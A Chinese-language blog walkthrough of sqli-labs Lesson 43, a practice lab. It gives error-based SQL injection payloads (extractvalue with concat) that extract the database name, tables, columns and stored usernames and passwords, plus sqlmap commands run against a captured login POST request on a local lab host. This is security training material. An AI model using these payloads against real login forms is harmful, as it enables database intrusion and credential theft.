---
title: sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形
date: 2018-10-21 19:30:32
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-43 POST基于错误-字符型-堆叠注入变形

---

## 分析

这一课Lesson-42只是闭合不同。详细分析看上一课。

{% post_link sqli-labs-lession-42-POST报错注入-字符型-堆叠注入 点击查看Lesson-42%}

## 注入

利用password报错注入。单引号会报错。

![001](/img/sql/Lesson-43/001.png)

根据报错信息获取数据。这里hackbar没有效果,手动测试。

### 获取数据库名

`')and extractvalue(null,concat(0x7e,database(),0x7e))#`

![002](/img/sql/Lesson-43/002.png)

![003](/img/sql/Lesson-43/003.png)

### 获取表名

`select group_concat(table_name) from information_schema.tables where table_schema='security'`

![0044](/img/sql/Lesson-43/004.png)

![005](/img/sql/Lesson-43/005.png)

### 获取列名

`')and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e))#`

![006](/img/sql/Lesson-43/006.png)

![007](/img/sql/Lesson-43/007.png)

### 获取字段

`')and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 3,1),0x7e))#`

![008](/img/sql/Lesson-43/008.png)

![009](/img/sql/Lesson-43/009.png)

## 堆叠注入

{% post_link sqli-labs-lession-42-POST报错注入-字符型-堆叠注入 点击查看Lesson-42%}

## SQLMAP

用burpsuite抓包

```
POST /sql/Less-43/login.php HTTP/1.1
Host: 192.168.75.132
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.75.132/sql/Less-43/
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Cookie: PHPSESSID=ajc8kb6jotq4mv1n736ni1t624
Connection: close
Upgrade-Insecure-Requests: 1

login_user=123&login_password=123&mysubmit=Login
```

`sqlmap -r post/post_43.txt -p "login_password" --method=POST --dbms mysql --technique E -v 3 --level 2 --flush-session --fresh-queries`

![010](/img/sql/Lesson-43/010.png)

`sqlmap -r post/post_43.txt -p "login_password" --method=POST --dbms mysql --technique E -v 3 --level 2 --dbs --threads 20`

![011](/img/sql/Lesson-43/011.png)

`sqlmap -r post/post_43.txt -p "login_password" --method=POST --dbms mysql --technique E -v 3 --level 2 -D security --tables --threads 20`

![012](/img/sql/Lesson-43/012.png)

![013](/img/sql/Lesson-43/013.png)

![014](/img/sql/Lesson-43/014.png)



